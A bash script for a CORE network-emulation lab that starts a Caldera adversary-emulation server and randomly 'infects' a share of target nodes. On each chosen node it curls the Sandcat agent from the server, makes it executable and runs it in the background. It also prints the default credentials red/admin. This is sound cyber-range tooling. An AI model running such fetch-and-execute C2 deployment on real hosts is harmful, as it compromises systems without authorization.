#!/bin/bash
# Caldera + Sandcat Agent Deployment Script for CORE
# This script starts Caldera and deploys Sandcat agents on random target hosts
#
# Usage: ./deploy-caldera-agents.sh <session_id> <caldera_node> <caldera_ip> [target_nodes...]
# Example: ./deploy-caldera-agents.sh 1 caldera1 10.0.1.2 target1 target2 target3
#
# If no target nodes specified, will deploy on ALL target* nodes found

SESSION_ID="${1:-1}"
CALDERA_NODE="${2:-caldera1}"
CALDERA_IP="${3:-10.0.1.2}"
CALDERA_PORT="8888"
CALDERA_URL="http://${CALDERA_IP}:${CALDERA_PORT}"
STARTUP_WAIT="${STARTUP_WAIT:-90}"  # Seconds to wait for Caldera to start
AGENT_PERCENTAGE="${AGENT_PERCENTAGE:-75}"  # Percentage of targets to infect (0-100)

shift 3
TARGET_NODES=("$@")

echo "=========================================="
echo "Caldera + Sandcat Deployment for CORE"
echo "=========================================="
echo "Session ID: ${SESSION_ID}"
echo "Caldera Node: ${CALDERA_NODE}"
echo "Caldera URL: ${CALDERA_URL}"
echo "Agent Coverage: ${AGENT_PERCENTAGE}%"
echo ""

# Step 1: Start Caldera server
echo "[1/4] Starting Caldera server on ${CALDERA_NODE}..."
vcmd -c /tmp/pycore.${SESSION_ID}/${CALDERA_NODE} -- bash -c "nohup /start-caldera.sh > /tmp/caldera.log 2>&1 &"

# Step 2: Wait for Caldera to start
echo "[2/4] Waiting for Caldera to start (up to ${STARTUP_WAIT}s)..."
for i in $(seq 1 ${STARTUP_WAIT}); do
    # Check if Caldera is responding
    HEALTH=$(vcmd -c /tmp/pycore.${SESSION_ID}/${CALDERA_NODE} -- curl -s -o /dev/null -w "%{http_code}" ${CALDERA_URL} 2>/dev/null)
    if [ "$HEALTH" = "200" ]; then
        echo "  Caldera is ready! (took ${i}s)"
        break
    fi
    if [ $((i % 10)) -eq 0 ]; then
        echo "  Still waiting... (${i}/${STARTUP_WAIT}s)"
    fi
    sleep 1
done

# Verify Caldera is actually running
HEALTH=$(vcmd -c /tmp/pycore.${SESSION_ID}/${CALDERA_NODE} -- curl -s -o /dev/null -w "%{http_code}" ${CALDERA_URL} 2>/dev/null)
if [ "$HEALTH" != "200" ]; then
    echo "ERROR: Caldera failed to start within ${STARTUP_WAIT}s"
    echo "Check logs: vcmd -c /tmp/pycore.${SESSION_ID}/${CALDERA_NODE} -- cat /tmp/caldera.log"
    exit 1
fi

echo ""
echo "Caldera Web UI: ${CALDERA_URL}"
echo "Credentials: red/admin or blue/admin"
echo ""

# Step 3: Find target nodes if not specified
if [ ${#TARGET_NODES[@]} -eq 0 ]; then
    echo "[3/4] Finding target nodes in session..."
    # List all nodes in session and filter for target*
    for node_dir in /tmp/pycore.${SESSION_ID}/*/; do
        node_name=$(basename "$node_dir")
        if [[ "$node_name" == target* ]] || [[ "$node_name" == host* ]] || [[ "$node_name" == client* ]]; then
            TARGET_NODES+=("$node_name")
        fi
    done
fi

if [ ${#TARGET_NODES[@]} -eq 0 ]; then
    echo "WARNING: No target nodes found!"
    echo "Available nodes:"
    ls -1 /tmp/pycore.${SESSION_ID}/
    exit 0
fi

echo "Found ${#TARGET_NODES[@]} potential target nodes: ${TARGET_NODES[*]}"

# Step 4: Randomly select targets and deploy agents
echo "[4/4] Deploying Sandcat agents..."

# Calculate how many targets to infect
TOTAL_TARGETS=${#TARGET_NODES[@]}
NUM_TO_INFECT=$(( (TOTAL_TARGETS * AGENT_PERCENTAGE + 99) / 100 ))  # Round up
if [ $NUM_TO_INFECT -lt 1 ]; then
    NUM_TO_INFECT=1
fi

echo "  Will deploy agents on ${NUM_TO_INFECT} of ${TOTAL_TARGETS} targets"

# Shuffle array and take first NUM_TO_INFECT
SHUFFLED=($(shuf -e "${TARGET_NODES[@]}"))
SELECTED_TARGETS=("${SHUFFLED[@]:0:$NUM_TO_INFECT}")

echo "  Selected targets: ${SELECTED_TARGETS[*]}"
echo ""

DEPLOYED=0
for target in "${SELECTED_TARGETS[@]}"; do
    echo "  Deploying agent on ${target}..."

    # Deploy Sandcat agent via vcmd
    vcmd -c /tmp/pycore.${SESSION_ID}/${target} -- bash -c "
        SERVER='${CALDERA_URL}'
        curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' \${SERVER}/file/download -o /tmp/sandcat 2>/dev/null
        if [ -f /tmp/sandcat ] && [ -s /tmp/sandcat ]; then
            chmod +x /tmp/sandcat
            nohup /tmp/sandcat -server \${SERVER} -group red -v > /tmp/sandcat.log 2>&1 &
            echo 'OK'
        else
            echo 'FAIL'
        fi
    " 2>/dev/null

    RESULT=$?
    if [ $RESULT -eq 0 ]; then
        ((DEPLOYED++))
        echo "    ✓ Agent deployed on ${target}"
    else
        echo "    ✗ Failed to deploy on ${target}"
    fi
done

echo ""
echo "=========================================="
echo "Deployment Complete!"
echo "=========================================="
echo "  Caldera: ${CALDERA_URL} (red/admin)"
echo "  Agents deployed: ${DEPLOYED}/${NUM_TO_INFECT}"
echo "  Target nodes: ${SELECTED_TARGETS[*]}"
echo ""
echo "To check agents in Caldera:"
echo "  1. Open ${CALDERA_URL} in browser (inside noVNC)"
echo "  2. Login as red/admin"
echo "  3. Go to Agents page to see connected agents"
echo "=========================================="
